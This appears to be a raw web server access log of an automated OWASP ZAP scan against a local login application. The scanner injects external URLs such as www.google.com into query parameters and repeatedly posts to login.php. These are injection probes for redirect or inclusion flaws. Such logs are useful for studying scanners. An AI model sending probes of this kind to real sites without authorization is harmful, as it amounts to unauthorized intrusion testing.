172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=www.google.com%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=www.google.com%3A80%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=www.google.com HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=www.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /robots.txt?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=www.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=www.google.com HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=www.google.com%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=www.google.com%3A80%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=www.google.com HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /setup.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:16 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
